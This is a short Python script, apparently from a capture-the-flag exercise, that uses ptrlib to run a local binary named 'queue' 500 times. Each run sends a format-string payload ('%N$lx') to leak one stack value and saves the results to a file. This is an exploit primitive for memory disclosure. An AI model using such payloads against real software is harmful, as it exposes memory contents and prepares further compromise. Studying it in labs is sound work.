#!/usr/bin/env python
import ptrlib as ptr


def unwrap(x):
    if x is None:
        print("failed to unwrap")
        exit(1)

    else:
        return x


exe = ptr.ELF("./queue")

dump = ""

for i in range(500):
    io = ptr.Process(exe.filepath)
    payload = f"#%{i + 1}$lx#".encode()
    io.sendline(payload)
    io.recvuntil(b"#")
    data = int(io.recvuntil(b"#").strip(b"#"), 16)
    new = f"{i + 1}: {hex(data)}\n"
    dump += new
    io.close()

with open("./dump.txt", "w") as f:
    f.write(dump)
